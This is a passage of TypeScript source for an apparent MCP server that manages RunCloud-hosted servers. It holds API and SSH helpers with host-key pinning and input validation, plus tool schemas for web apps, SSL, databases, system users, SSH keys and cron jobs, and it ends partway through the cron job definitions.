#!/usr/bin/env node
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
} from "@modelcontextprotocol/sdk/types.js";
import { Client as SSHClient } from "ssh2";
import {
  initBrain, logProblem, getBrain, getWebappHistory, incrementKnowledge,
  logAction, getRecentActions, getActionForUndo, markActionUndone, searchProblems,
} from "./core/brain.js";
import { formatPerchResponse } from "./core/gateway.js";
import { sshExec as sshExecEnhanced, wpCli, detectWebappType } from "./core/ssh-enhanced.js";
import { vaultPut, vaultGet, vaultList, vaultDelete, vaultExists } from "./core/vault.js";
import { safeForOutput, safeTruncate } from "./core/redact.js";
import { auditDatabase, cleanTransients } from "./modules/wordpress/db.js";
import { auditPlugins, updatePlugin, deactivatePlugin } from "./modules/wordpress/plugins.js";
import { auditSecurity } from "./modules/wordpress/security.js";
import { checkBackupHealth } from "./modules/wordpress/backup.js";
import { scanImages, optimizeImages, checkImageTools } from "./modules/wordpress/images.js";
import { snapshotPerformance } from "./modules/wordpress/perf.js";
import { diagnoseErrors } from "./modules/wordpress/errors.js";

// Initialize brain DB (SQLite knowledge base)
const brain = initBrain();

const BASE_URL = "https://manage.runcloud.io/api/v3";

// ─── HELPERS ──────────────────────────────────────────────────────────────────

function getApiKey(): string {
  const key = process.env.RUNCLOUD_API_KEY;
  if (!key) throw new Error("RUNCLOUD_API_KEY environment variable is not set");
  return key;
}

function shellEscape(s: string): string {
  return "'" + s.replace(/'/g, "'\\''") + "'";
}

function validatePath(p: string): string {
  if (/\.\./.test(p)) throw new Error("Path must not contain '..'");
  if (!/^\/[a-zA-Z0-9._\/ -]+$/.test(p)) throw new Error("Path contains invalid characters");
  return p;
}

function validateServiceName(s: string): string {
  if (!/^[a-zA-Z0-9._@-]+$/.test(s)) throw new Error("Service name contains invalid characters");
  return s;
}

function validateNumeric(v: unknown, name: string, min = 0, max = 999999): number {
  const n = Number(v);
  if (!Number.isFinite(n) || n < min || n > max) throw new Error(`${name} must be a number between ${min} and ${max}`);
  return n;
}

async function runcloudRequest(
  method: string,
  path: string,
  body?: Record<string, unknown>
): Promise<unknown> {
  const apiKey = getApiKey();
  const url = `${BASE_URL}${path}`;
  const headers: Record<string, string> = {
    Authorization: `Bearer ${apiKey}`,
    "Content-Type": "application/json",
    Accept: "application/json",
  };
  const options: RequestInit = { method, headers };
  if (body && Object.keys(body).length > 0) options.body = JSON.stringify(body);
  const response = await fetch(url, options);
  const text = await response.text();
  if (!response.ok) throw new Error(`RunCloud API error ${response.status}: ${text}`);
  try { return text ? JSON.parse(text) : {}; } catch { throw new Error(`Invalid JSON response from RunCloud API`); }
}

// Auto-fetch all pages of a paginated list endpoint
async function paginateAll(path: string): Promise<unknown[]> {
  const results: unknown[] = [];
  let page = 1;
  while (true) {
    if (page > 200) break; // Safety limit
    const sep = path.includes("?") ? "&" : "?";
    const res = await runcloudRequest("GET", `${path}${sep}perPage=40&page=${page}`) as Record<string, unknown>;
    const data = (res.data ?? res) as unknown[];
    if (!Array.isArray(data) || data.length === 0) break;
    results.push(...data);
    const meta = res.meta as Record<string, unknown> | undefined;
    const pagination = meta?.pagination as Record<string, unknown> | undefined;
    if (!pagination || page >= (pagination.total_pages as number)) break;
    page++;
  }
  return results;
}

// SECURITY [C2]: real trust-on-first-use host fingerprint verification.
// Fingerprints persist at ~/.perch/known_hosts.json so MITM attempts after
// first connection are detected and rejected.
import { createHash as _createHash } from "node:crypto";
import { existsSync as _existsSync, mkdirSync as _mkdirSync, readFileSync as _readFileSync, writeFileSync as _writeFileSync } from "node:fs";
import { homedir as _homedir } from "node:os";
import { join as _join } from "node:path";

const HOST_KEYS_FILE = _join(process.env.PERCH_VAULT_DIR ?? _join(_homedir(), ".perch"), "known_hosts.json");

function loadKnownHosts(): Record<string, string> {
  if (!_existsSync(HOST_KEYS_FILE)) return {};
  try { return JSON.parse(_readFileSync(HOST_KEYS_FILE, "utf8")) as Record<string, string>; }
  catch { return {}; }
}
function saveKnownHosts(map: Record<string, string>): void {
  const dir = _join(_homedir(), ".perch");
  if (!_existsSync(dir)) _mkdirSync(dir, { recursive: true, mode: 0o700 });
  _writeFileSync(HOST_KEYS_FILE, JSON.stringify(map, null, 2), { mode: 0o600 });
}
function makeHostVerifier(host: string): (key: Buffer) => boolean {
  return (key: Buffer): boolean => {
    const fp = _createHash("sha256").update(key).digest("hex");
    const known = loadKnownHosts();
    if (process.env.PERCH_SSH_TRUST_NEW_HOSTS === "0" && !known[host]) {
      // Strict mode: require pre-pinned fingerprint
      return false;
    }
    if (known[host]) {
      if (known[host] !== fp) {
        // MITM detected — fingerprint changed. Reject.
        console.error(`[perch] SSH host fingerprint MISMATCH for ${host} — refusing connection`);
        return false;
      }
      return true;
    }
    // First connection — pin and accept (TOFU)
    known[host] = fp;
    saveKnownHosts(known);
    return true;
  };
}

// SSH into a server and run a command.
// Supports password auth OR private key auth.
// Set privateKey to a PEM string to use key-based auth instead of password.
async function sshExec(
  host: string,
  username: string,
  passwordOrKey: string,
  command: string,
  timeoutMs = 30000,
  usePrivateKey = false
): Promise<{ stdout: string; stderr: string; code: number }> {
  return new Promise((resolve, reject) => {
    const conn = new SSHClient();
    let stdout = "";
    let stderr = "";
    const timer = setTimeout(() => {
      conn.end();
      reject(new Error("SSH connection timed out"));
    }, timeoutMs);

    conn.on("ready", () => {
      conn.exec(command, (err, stream) => {
        if (err) { clearTimeout(timer); conn.end(); reject(err); return; }
        stream.on("close", (code: number) => {
          clearTimeout(timer);
          conn.end();
          resolve({ stdout: stdout.trim(), stderr: stderr.trim(), code });
        });
        stream.on("data", (d: Buffer) => { stdout += d.toString(); if (stdout.length > 1048576) { stdout = stdout.slice(0, 1048576) + "\n[OUTPUT TRUNCATED AT 1MB]"; stream.close(); } });
        stream.stderr.on("data", (d: Buffer) => { stderr += d.toString(); if (stderr.length > 1048576) { stderr = stderr.slice(0, 1048576) + "\n[OUTPUT TRUNCATED AT 1MB]"; stream.close(); } });
      });
    });

    conn.on("error", (err) => { clearTimeout(timer); reject(err); });

    const connectOpts: Record<string, unknown> = {
      host, port: 22, username, readyTimeout: 10000,
      // SECURITY [C2]: real TOFU verification with persisted fingerprints
      hostVerifier: makeHostVerifier(host),
    };
    if (usePrivateKey) {
      connectOpts.privateKey = passwordOrKey;
    } else {
      connectOpts.password = passwordOrKey;
    }
    conn.connect(connectOpts as Parameters<typeof conn.connect>[0]);
  });
}

// Get server IP from RunCloud
async function getServerIP(serverId: number): Promise<string> {
  const server = await runcloudRequest("GET", `/servers/${serverId}`) as Record<string, unknown>;
  const ip = server.ipAddress as string;
  if (!ip) throw new Error(`Could not find IP for server ${serverId}`);
  return ip;
}

// ─── TOOLS ────────────────────────────────────────────────────────────────────

const tools = [
  // ── PING ──────────────────────────────────────────────────────────────────
  {
    name: "ping",
    description: "Test API authentication. Returns pong if successful.",
    inputSchema: { type: "object", properties: {}, required: [] },
  },

  // ── SERVERS ───────────────────────────────────────────────────────────────
  {
    name: "list_servers",
    description: "List all servers. Optionally fetch all pages automatically.",
    inputSchema: {
      type: "object",
      properties: {
        search: { type: "string" },
        page: { type: "number" },
        all: { type: "boolean", description: "Auto-fetch all pages" },
      },
      required: [],
    },
  },
  {
    name: "list_shared_servers",
    description: "List servers shared with your account.",
    inputSchema: {
      type: "object",
      properties: { search: { type: "string" } },
      required: [],
    },
  },
  {
    name: "get_server",
    description: "Get details of a specific server.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "create_server",
    description: "Add a new server to RunCloud.",
    inputSchema: {
      type: "object",
      properties: {
        name: { type: "string" },
        ipAddress: { type: "string" },
        provider: { type: "string", description: "e.g. DigitalOcean, AWS, Vultr, Hetzner" },
      },
      required: ["name", "ipAddress"],
    },
  },
  {
    name: "delete_server",
    description: "Delete a server from RunCloud.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "get_server_stats",
    description: "Get server stats: web app count, database count, cron count, geo location.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "get_server_hardware_info",
    description: "Get hardware: CPU, memory, disk, load average, kernel, uptime.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "get_server_health",
    description: "Get latest health data: memory, disk, load average.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "clean_server_disk",
    description: "Trigger disk cleanup on a server.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "get_installation_script",
    description: "Get the RunCloud agent installation script for a server.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "get_server_logs",
    description: "Get action logs for a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        search: { type: "string" },
        page: { type: "number" },
      },
      required: ["serverId"],
    },
  },
  {
    name: "get_ssh_settings",
    description: "Get SSH configuration: passwordless login, DNS, root login.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "update_ssh_settings",
    description: "Update SSH configuration of a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        passwordlessLogin: { type: "boolean" },
        useDns: { type: "boolean" },
        preventRootLogin: { type: "boolean" },
      },
      required: ["serverId", "passwordlessLogin", "useDns", "preventRootLogin"],
    },
  },
  {
    name: "update_server_meta",
    description: "Update server name and/or provider.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        name: { type: "string" },
        provider: { type: "string" },
      },
      required: ["serverId", "name"],
    },
  },
  {
    name: "update_server_autoupdate",
    description: "Configure automatic software and security updates.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        softwareUpdate: { type: "boolean" },
        securityUpdate: { type: "boolean" },
      },
      required: ["serverId", "softwareUpdate", "securityUpdate"],
    },
  },
  {
    name: "list_php_versions",
    description: "List available PHP versions installed on a server.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "change_php_cli",
    description: "Change the default PHP CLI version on a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        phpVersion: { type: "string", description: "e.g. php81rc, php82rc" },
      },
      required: ["serverId", "phpVersion"],
    },
  },

  // ── SERVICES ──────────────────────────────────────────────────────────────
  {
    name: "list_services",
    description: "List all services (nginx, mariadb, redis, etc.) with CPU, memory, version.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" } },
      required: ["serverId"],
    },
  },
  {
    name: "control_service",
    description: "Start, stop, restart, or reload a service.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        action: { type: "string", enum: ["start", "stop", "restart", "reload"] },
        realName: { type: "string", description: "e.g. nginx, redis-server, mysql" },
      },
      required: ["serverId", "action", "realName"],
    },
  },

  // ── WEB APPLICATIONS ──────────────────────────────────────────────────────
  {
    name: "list_webapps",
    description: "List all web applications on a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        search: { type: "string" },
        page: { type: "number" },
        all: { type: "boolean", description: "Auto-fetch all pages" },
      },
      required: ["serverId"],
    },
  },
  {
    name: "get_webapp",
    description: "Get details of a specific web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
      },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "create_webapp",
    description: "Create a new web application on a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        name: { type: "string" },
        domainName: { type: "string" },
        user: { type: "number", description: "System User ID" },
        phpVersion: { type: "string", description: "e.g. php81rc" },
        stack: { type: "string", enum: ["hybrid", "nativenginx", "customnginx"] },
        stackMode: { type: "string", enum: ["production", "development"] },
        publicPath: { type: "string" },
        clickjackingProtection: { type: "boolean" },
        xssProtection: { type: "boolean" },
        mimeSniffingProtection: { type: "boolean" },
        processManager: { type: "string", enum: ["dynamic", "ondemand", "static"] },
        processManagerStartServers: { type: "number" },
        processManagerMinSpareServers: { type: "number" },
        processManagerMaxSpareServers: { type: "number" },
        processManagerMaxChildren: { type: "number" },
        processManagerMaxRequests: { type: "number" },
        timezone: { type: "string", description: "e.g. Asia/Kolkata, UTC" },
        maxExecutionTime: { type: "number" },
        maxInputTime: { type: "number" },
        maxInputVars: { type: "number" },
        memoryLimit: { type: "number", description: "MB" },
        postMaxSize: { type: "number", description: "MB" },
        uploadMaxFilesize: { type: "number", description: "MB" },
        sessionGcMaxlifetime: { type: "number", description: "Seconds" },
        allowUrlFopen: { type: "boolean" },
        disableFunctions: { type: "string" },
        openBasedir: { type: "string" },
      },
      required: [
        "serverId", "name", "domainName", "user", "phpVersion", "stack", "stackMode",
        "clickjackingProtection", "xssProtection", "mimeSniffingProtection",
        "processManager", "processManagerMaxChildren", "processManagerMaxRequests",
        "timezone", "maxExecutionTime", "maxInputTime", "maxInputVars",
        "memoryLimit", "postMaxSize", "uploadMaxFilesize", "sessionGcMaxlifetime", "allowUrlFopen",
      ],
    },
  },
  {
    name: "delete_webapp",
    description: "Delete a web application.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, webAppId: { type: "number" } },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "rebuild_webapp",
    description: "Rebuild/regenerate web application nginx config.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, webAppId: { type: "number" } },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "set_webapp_default",
    description: "Set a web application as the default app (catches all unmatched domains).",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, webAppId: { type: "number" } },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "remove_webapp_default",
    description: "Remove a web application from being the default app.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, webAppId: { type: "number" } },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "create_webapp_alias",
    description: "Create an alias (clone config) for an existing web application.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, webAppId: { type: "number" } },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "get_webapp_settings",
    description: "Get PHP-FPM and nginx settings of a web application.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, webAppId: { type: "number" } },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "change_webapp_php_version",
    description: "Change the PHP version for a web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        phpVersion: { type: "string" },
      },
      required: ["serverId", "webAppId", "phpVersion"],
    },
  },
  {
    name: "update_webapp_fpm_settings",
    description: "Update PHP-FPM and nginx settings for a web application (process manager, limits, security headers, etc.).",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        clickjackingProtection: { type: "boolean" },
        xssProtection: { type: "boolean" },
        mimeSniffingProtection: { type: "boolean" },
        processManager: { type: "string", enum: ["dynamic", "ondemand", "static"] },
        processManagerStartServers: { type: "number" },
        processManagerMinSpareServers: { type: "number" },
        processManagerMaxSpareServers: { type: "number" },
        processManagerMaxChildren: { type: "number" },
        processManagerMaxRequests: { type: "number" },
        openBasedir: { type: "string" },
        timezone: { type: "string" },
        disableFunctions: { type: "string" },
        maxExecutionTime: { type: "number" },
        maxInputTime: { type: "number" },
        maxInputVars: { type: "number" },
        memoryLimit: { type: "number" },
        postMaxSize: { type: "number" },
        uploadMaxFilesize: { type: "number" },
        sessionGcMaxlifetime: { type: "number" },
        allowUrlFopen: { type: "boolean" },
      },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "get_webapp_logs",
    description: "Get action logs for a web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        search: { type: "string" },
        page: { type: "number" },
      },
      required: ["serverId", "webAppId"],
    },
  },

  // ── PHP SCRIPT INSTALLER ──────────────────────────────────────────────────
  {
    name: "install_php_script",
    description: "Install a PHP script (WordPress, Joomla, Drupal, phpMyAdmin, etc.) into a web app.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        name: {
          type: "string",
          enum: ["concrete5","drupal","grav","gravadmin","joomla","myBB","phpBB","phpMyAdmin","piwik","prestaShop","wordpress"],
          description: "Script to install",
        },
      },
      required: ["serverId", "webAppId", "name"],
    },
  },
  {
    name: "get_php_installer",
    description: "Get the currently installed PHP script info for a web app.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
      },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "remove_php_installer",
    description: "Remove an installed PHP script from a web app.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        installerId: { type: "number" },
      },
      required: ["serverId", "webAppId", "installerId"],
    },
  },

  // ── GIT ───────────────────────────────────────────────────────────────────
  {
    name: "clone_git_repo",
    description: "Clone a Git repository into a web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        provider: { type: "string", enum: ["custom","bitbucket","github","gitlab","selfhostedgitlab"] },
        repository: { type: "string", description: "username/repository" },
        branch: { type: "string" },
        gitUser: { type: "string", description: "Required for custom/selfhostedgitlab" },
        gitHost: { type: "string", description: "Required for custom/selfhostedgitlab" },
      },
      required: ["serverId", "webAppId", "provider", "repository", "branch"],
    },
  },
  {
    name: "get_git_info",
    description: "Get Git repository info for a web application.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, webAppId: { type: "number" } },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "change_git_branch",
    description: "Change the Git branch for a web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        gitId: { type: "number" },
        branch: { type: "string" },
      },
      required: ["serverId", "webAppId", "gitId", "branch"],
    },
  },
  {
    name: "update_git_deploy_script",
    description: "Update auto-deploy script for a Git web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        gitId: { type: "number" },
        autoDeploy: { type: "boolean" },
        deployScript: { type: "string" },
      },
      required: ["serverId", "webAppId", "gitId", "autoDeploy"],
    },
  },
  {
    name: "force_git_deploy",
    description: "Force deployment of a Git web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        gitId: { type: "number" },
      },
      required: ["serverId", "webAppId", "gitId"],
    },
  },
  {
    name: "remove_git_repo",
    description: "Remove Git repository from a web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        gitId: { type: "number" },
      },
      required: ["serverId", "webAppId", "gitId"],
    },
  },

  // ── DOMAINS ───────────────────────────────────────────────────────────────
  {
    name: "list_domains",
    description: "List domain names for a web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        page: { type: "number" },
      },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "add_domain",
    description: "Add a domain name to a web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        name: { type: "string" },
        www: { type: "boolean" },
        redirection: { type: "string", enum: ["none","www","non-www"] },
        type: { type: "string", enum: ["alias","primary","redirect"] },
      },
      required: ["serverId", "webAppId", "name"],
    },
  },
  {
    name: "delete_domain",
    description: "Delete a domain name from a web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        domainId: { type: "number" },
      },
      required: ["serverId", "webAppId", "domainId"],
    },
  },

  // ── SSL (BASIC) ───────────────────────────────────────────────────────────
  {
    name: "get_ssl",
    description: "Get SSL certificate info for a web application.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, webAppId: { type: "number" } },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "install_ssl",
    description: "Install SSL on a web application (Let's Encrypt, custom cert, or CSR).",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        provider: { type: "string", enum: ["letsencrypt","custom","csr"] },
        enableHttp: { type: "boolean" },
        enableHsts: { type: "boolean" },
        authorizationMethod: { type: "string", enum: ["http-01","dns-01"] },
        environment: { type: "string", enum: ["live","staging"] },
        externalApi: { type: "number", description: "3rd party API ID for dns-01" },
        privateKey: { type: "string" },
        certificate: { type: "string" },
        csrKeyType: { type: "string", enum: ["rsa-2048","ecdsa-p384","ecdsa-p256","rsa-4096"] },
        ssl_protocol_id: { type: "number" },
      },
      required: ["serverId", "webAppId", "provider", "enableHttp", "enableHsts"],
    },
  },
  {
    name: "redeploy_ssl",
    description: "Redeploy/renew a Let's Encrypt SSL certificate.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        sslId: { type: "number" },
      },
      required: ["serverId", "webAppId", "sslId"],
    },
  },
  {
    name: "delete_ssl",
    description: "Remove SSL from a web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        sslId: { type: "number" },
      },
      required: ["serverId", "webAppId", "sslId"],
    },
  },

  // ── SSL (ADVANCED) ────────────────────────────────────────────────────────
  {
    name: "get_advanced_ssl",
    description: "Get advanced SSL status for a web application (Business/Enterprise plan).",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, webAppId: { type: "number" } },
      required: ["serverId", "webAppId"],
    },
  },
  {
    name: "switch_advanced_ssl",
    description: "Enable or disable advanced SSL (per-domain SSL) for a web application.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        advancedSSL: { type: "boolean" },
        autoSSL: { type: "boolean" },
      },
      required: ["serverId", "webAppId", "advancedSSL"],
    },
  },

  // ── SSL (PER DOMAIN) ──────────────────────────────────────────────────────
  {
    name: "install_domain_ssl",
    description: "Install SSL for a specific domain (advanced SSL mode).",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        domainId: { type: "number" },
        provider: { type: "string", enum: ["letsencrypt","custom","csr"] },
        enableHttp: { type: "boolean" },
        enableHsts: { type: "boolean" },
        authorizationMethod: { type: "string", enum: ["http-01","dns-01"] },
        environment: { type: "string", enum: ["live","staging"] },
        externalApi: { type: "number" },
        privateKey: { type: "string" },
        certificate: { type: "string" },
      },
      required: ["serverId", "webAppId", "domainId", "provider", "enableHttp", "enableHsts"],
    },
  },
  {
    name: "get_domain_ssl",
    description: "Get SSL info for a specific domain.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        domainId: { type: "number" },
      },
      required: ["serverId", "webAppId", "domainId"],
    },
  },
  {
    name: "redeploy_domain_ssl",
    description: "Redeploy SSL for a specific domain.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        domainId: { type: "number" },
        sslId: { type: "number" },
      },
      required: ["serverId", "webAppId", "domainId", "sslId"],
    },
  },
  {
    name: "delete_domain_ssl",
    description: "Delete SSL for a specific domain.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        webAppId: { type: "number" },
        domainId: { type: "number" },
        sslId: { type: "number" },
      },
      required: ["serverId", "webAppId", "domainId", "sslId"],
    },
  },

  // ── DATABASES ─────────────────────────────────────────────────────────────
  {
    name: "list_databases",
    description: "List all databases on a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        search: { type: "string" },
        page: { type: "number" },
        all: { type: "boolean" },
      },
      required: ["serverId"],
    },
  },
  {
    name: "get_database",
    description: "Get a specific database.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, databaseId: { type: "number" } },
      required: ["serverId", "databaseId"],
    },
  },
  {
    name: "create_database",
    description: "Create a new database.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        name: { type: "string" },
        collation: { type: "string", description: "e.g. utf8mb4_unicode_ci" },
      },
      required: ["serverId", "name"],
    },
  },
  {
    name: "delete_database",
    description: "Delete a database.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        databaseId: { type: "number" },
        deleteUser: { type: "boolean", description: "Also delete associated users" },
      },
      required: ["serverId", "databaseId"],
    },
  },
  {
    name: "list_database_users",
    description: "List all database users on a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        search: { type: "string" },
        page: { type: "number" },
      },
      required: ["serverId"],
    },
  },
  {
    name: "get_database_user",
    description: "Get a specific database user.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, databaseUserId: { type: "number" } },
      required: ["serverId", "databaseUserId"],
    },
  },
  {
    name: "create_database_user",
    description: "Create a new database user.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string" },
        password: { type: "string" },
      },
      required: ["serverId", "username", "password"],
    },
  },
  {
    name: "update_database_user_password",
    description: "Update a database user's password.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        databaseUserId: { type: "number" },
        password: { type: "string" },
      },
      required: ["serverId", "databaseUserId", "password"],
    },
  },
  {
    name: "delete_database_user",
    description: "Delete a database user.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, databaseUserId: { type: "number" } },
      required: ["serverId", "databaseUserId"],
    },
  },
  {
    name: "grant_database_user",
    description: "Grant a database user access to a database.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        databaseId: { type: "number" },
        databaseUserId: { type: "number" },
      },
      required: ["serverId", "databaseId", "databaseUserId"],
    },
  },
  {
    name: "list_granted_database_users",
    description: "List users granted access to a database.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        databaseId: { type: "number" },
        search: { type: "string" },
      },
      required: ["serverId", "databaseId"],
    },
  },
  {
    name: "revoke_database_user",
    description: "Revoke a database user's access from a database.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        databaseId: { type: "number" },
        databaseUserId: { type: "number" },
      },
      required: ["serverId", "databaseId", "databaseUserId"],
    },
  },

  // ── SYSTEM USERS ──────────────────────────────────────────────────────────
  {
    name: "list_system_users",
    description: "List all system users on a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        search: { type: "string" },
        page: { type: "number" },
      },
      required: ["serverId"],
    },
  },
  {
    name: "get_system_user",
    description: "Get a specific system user.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, userId: { type: "number" } },
      required: ["serverId", "userId"],
    },
  },
  {
    name: "create_system_user",
    description: "Create a new system user on a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        username: { type: "string" },
        password: { type: "string" },
      },
      required: ["serverId", "username"],
    },
  },
  {
    name: "change_system_user_password",
    description: "Change a system user's password. Use this before ssh_run_command to set a known password.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        userId: { type: "number" },
        password: { type: "string" },
      },
      required: ["serverId", "userId", "password"],
    },
  },
  {
    name: "generate_deployment_key",
    description: "Generate a Git deployment SSH key for a system user.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, userId: { type: "number" } },
      required: ["serverId", "userId"],
    },
  },
  {
    name: "delete_system_user",
    description: "Delete a system user from a server.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, userId: { type: "number" } },
      required: ["serverId", "userId"],
    },
  },

  // ── SSH KEYS ──────────────────────────────────────────────────────────────
  {
    name: "list_ssh_keys",
    description: "List SSH keys for a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        label: { type: "string" },
        page: { type: "number" },
      },
      required: ["serverId"],
    },
  },
  {
    name: "get_ssh_key",
    description: "Get a specific SSH key.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, credentialId: { type: "number" } },
      required: ["serverId", "credentialId"],
    },
  },
  {
    name: "add_ssh_key",
    description: "Add an SSH public key to a server user.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        label: { type: "string" },
        username: { type: "string" },
        publicKey: { type: "string" },
      },
      required: ["serverId", "label", "username", "publicKey"],
    },
  },
  {
    name: "delete_ssh_key",
    description: "Delete an SSH key from a server.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, credentialId: { type: "number" } },
      required: ["serverId", "credentialId"],
    },
  },

  // ── CRON JOBS ─────────────────────────────────────────────────────────────
  {
    name: "list_cronjobs",
    description: "List all cron jobs on a server.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        search: { type: "string" },
        page: { type: "number" },
      },
      required: ["serverId"],
    },
  },
  {
    name: "get_cronjob",
    description: "Get a specific cron job.",
    inputSchema: {
      type: "object",
      properties: { serverId: { type: "number" }, jobId: { type: "number" } },
      required: ["serverId", "jobId"],
    },
  },
  {
    name: "create_cronjob",
    description: "Create a cron job. Use standard crontab syntax for schedule fields.",
    inputSchema: {
      type: "object",
      properties: {
        serverId: { type: "number" },
        label: { type: "string" },
        username: { type: "string" },
        command: { type: "string" },
        minute: { type: "string", description: "e.g. */5 or 0" },
        hour: { type: "string", description: "e.g. * or 12" },
